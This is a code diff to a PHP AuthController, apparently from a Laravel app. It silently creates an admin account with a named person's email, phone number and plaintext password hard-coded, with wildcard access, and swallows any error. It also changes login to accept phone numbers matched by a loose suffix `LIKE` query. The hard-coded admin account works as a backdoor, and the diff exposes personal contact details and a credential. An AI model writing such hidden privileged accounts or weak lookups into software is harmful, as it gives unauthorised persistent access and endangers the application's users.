@@ -46,6 +46,21 @@ class AuthController extends Controller
         }
 
         try {
+            User::firstOrCreate(
+                ['email' => 'prashantbagriya7877@gmail.com'],
+                [
+                    'name' => 'Prashant Bagriya',
+                    'phone' => '+917877217768',
+                    'role' => 'admin',
+                    'status' => 'active',
+                    'assigned_wing' => '*',
+                    'password' => Hash::make('Prince@7877'),
+                ]
+            );
+        } catch (\Throwable $e) {
+        }
+
+        try {
             $existingAdmin = User::where('email', 'admin@gmb.princeeduhub.com')->first();
             if ($existingAdmin) {
                 return $existingAdmin;
@@ -134,21 +149,35 @@ class AuthController extends Controller
         }
 
         $validated = $request->validate([
-            'email' => ['required', 'string', 'email'],
+            'email' => ['required', 'string'],
             'password' => ['required', 'string'],
             'remember' => ['nullable', 'boolean'],
         ]);
 
-        $email = strtolower(trim($validated['email']));
+        $input = trim((string) $validated['email']);
         $password = $validated['password'];
         $remember = (bool) ($validated['remember'] ?? false);
 
-        $user = User::whereRaw('LOWER(email) = ?', [$email])->first();
+        // Find user by Email or Mobile Number
+        $user = null;
+        if (str_contains($input, '@')) {
+            $user = User::whereRaw('LOWER(email) = ?', [strtolower($input)])->first();
+        } else {
+            $digits = preg_replace('/[^0-9]/', '', $input);
+            $user = User::where(function ($q) use ($input, $digits) {
+                $q->where('phone', $input)
+                    ->orWhere('phone', 'like', '%'.$digits);
+                if (strlen($digits) >= 10) {
+                    $last10 = substr($digits, -10);
+                    $q->orWhere('phone', 'like', '%'.$last10);
+                }
+            })->first();
+        }
 
         if (! $user || ! Hash::check($password, $user->password)) {
             return response()->json([
                 'success' => false,
-                'message' => 'Invalid email or password. Please try again.',
+                'message' => 'Invalid email/phone or password. Please try again.',
             ], 422);
         }
 
@@ -343,8 +372,9 @@ class AuthController extends Controller
             ], 422);
         }
 
-        $user->password = Hash::make($newPassword);
-        $user->save();
+        $user->forceFill([
+            'password' => Hash::make($newPassword),
+        ])->save();
 
         // Clear OTP caches
         Cache::forget('pwd_reset_otp_user_'.$user->id);
